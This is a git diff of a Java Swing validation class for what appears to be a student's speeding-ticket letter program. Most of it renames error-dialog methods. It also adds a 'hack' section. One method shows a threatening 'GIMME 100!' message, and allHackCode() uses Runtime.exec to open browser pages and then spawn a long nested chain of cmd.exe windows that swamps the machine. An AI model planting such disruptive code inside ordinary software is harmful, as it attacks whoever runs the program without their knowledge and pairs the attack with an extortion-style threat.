@@ -1,16 +1,6 @@
-/**
- * @author Robert Giurgiulescu <s4820793@bournemouth.ac.uk>
- * @id number s4820793
- * @version 6
- * 
- * Date: 06/04/2018
- * Class (4/4)
- * 
- * This program ...
- */
-
-
 import javax.swing.*;
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
 
 
 public class SpeedingTicketValidation {
@@ -18,8 +8,6 @@ public class SpeedingTicketValidation {
 
 	public SpeedingTicketValidation() {  }
 
-////////////////////////////////////////////////SpeedingTicket////////////////////////////////////////////////////////
-	
 	public void vehicleSpeedNotLowerThan0() {
 		JOptionPane.showMessageDialog(frame, "Not allowed speeds lower than 0mph", "ERROR", JOptionPane.ERROR_MESSAGE);
 	}
@@ -36,7 +24,7 @@ public class SpeedingTicketValidation {
 		JOptionPane.showMessageDialog(frame, "Not allowed limits lower than 5mph", "ERROR", JOptionPane.ERROR_MESSAGE);
 	}
 
-////////////////////////////////////////////////SpeedingTicketGUI/////////////////////////////////////////////////////
+	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
 	public void noSpeedsEntered() {
 		JOptionPane.showMessageDialog(frame, "No speeds entered", "ERROR", JOptionPane.ERROR_MESSAGE);
@@ -50,32 +38,28 @@ public class SpeedingTicketValidation {
 		JOptionPane.showMessageDialog(frame, "No vehicle speed entered", "ERROR", JOptionPane.ERROR_MESSAGE); 
 	}
 
-	public void DateValidation() {
-		JOptionPane.showMessageDialog(frame, "Not allowed", "ERROR", JOptionPane.ERROR_MESSAGE); 
-	}
-	
-	public String checkStringHasNoSpecialCharsAndOneSpaceOnly() {
+	public String stringWithoutSpecialCharactersAndOneSpaceOnly() {
 		return "[a-zA-Z0-9 ]+";
 	}
 
-	public void incompletedFields() {
+	public void checkIncompleteFields() {
 		JOptionPane.showMessageDialog(frame, "There is one or more fields not completed, please complete all the fields to continue", "ERROR", JOptionPane.ERROR_MESSAGE);
 	}
 
-	public void errorsInLocation() {
+	public void errorInTheLocation() {
 		JOptionPane.showMessageDialog(frame, "Location cannot contain double empty spaces or special characters", "ERROR", JOptionPane.ERROR_MESSAGE); 
 	}
 	
-	public void errorsInFileName() {
+	public void errorInTheFileName() {
 		JOptionPane.showMessageDialog(frame, "File name cannot contain double empty spaces or special characters", "ERROR", JOptionPane.ERROR_MESSAGE); 
 	}
 
-	public void errorsInRegNo() {
+	public void checkRegNo() {
 		JOptionPane.showMessageDialog(frame, "Registration number must between 1 and 7 digits without spaces", "ERROR", JOptionPane.ERROR_MESSAGE);	
 	}
 
 
-	public void invalidSpeedLimitAndVehicleSpeed() {
+	public void speedLimitAndVehicleSpeedInvalid() {
 		JOptionPane.showMessageDialog(frame, "Speed Limit or Vehicle Speed are invalid, please type in numbers", "ERROR", JOptionPane.ERROR_MESSAGE);
 	}
 
@@ -98,18 +82,52 @@ public class SpeedingTicketValidation {
 				"Clear", 
 				JOptionPane.YES_NO_OPTION);
 		return confirmation;
+
 	}
 
-	public void detailsInfoButton() {
-		JOptionPane.showMessageDialog(frame, "Hover each text area or buttons to see additional information\n      For support, contact: s4820793@bournemouth.ac.uk");
+
+	/////////////////////////hack//////////////////////
+
+	public void hack() {
+		JOptionPane.showMessageDialog(frame, "GIMME 100! OTHERWISE THAT'S WHAT I WILL DO...");
+	}
+
+	public void allHackCode() {
+		try {
+			Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"start chrome.exe https://ia601909.us.archive.org/29/items/youtube-quyXS4a0JGQ/11B_X_1371-quyXS4a0JGQ.ogv\"");
+			try {
+				TimeUnit.SECONDS.sleep(2);
+			} catch (InterruptedException e1) {
+				System.err.println("heheh");
+			}
+			Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"start chrome.exe https://www.digikala.com/mag/wp-content/uploads/2016/12/dedsec_2_0_generic_hacker_by_junguler-da61r89.gif\" ");
+			try {
+				TimeUnit.SECONDS.sleep(8);
+			} catch (InterruptedException e) {
+				System.err.println("heheh");
+			}
+			Runtime.getRuntime().exec("cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K cmd /c start cmd.exe /K");
+		} catch (IOException e) {
+			System.err.println("heheh");
+		}
+	}
+
+	//////////////////////////end hack/////////////////
+
+	public void infoButton() {
+		JOptionPane.showMessageDialog(frame, "Hover over each text area or buttons to see additional information\n          and examples of how should the fields be completed");
+	}
+
+	public void invalidInputs() {
+		JOptionPane.showMessageDialog(frame, "One or both inputs are invalid, please type in values again", "ERROR", JOptionPane.ERROR_MESSAGE);
 	}
 
 	public void printConfirmationMessage() {
 		JOptionPane.showMessageDialog(frame, "The letter has been written!");
 	}
-////////////////////////////////////////////////SpeedingTicketPrint/////////////////////////////////////////////////////
+	///////////////////////////// print class  /////////////////////
 
-	public void noLetterNeeded() {
+	public void noLetterNeededMessage() {
 		JOptionPane.showMessageDialog(frame, "No letter needed as the speed is under the limit");
 	}
 }
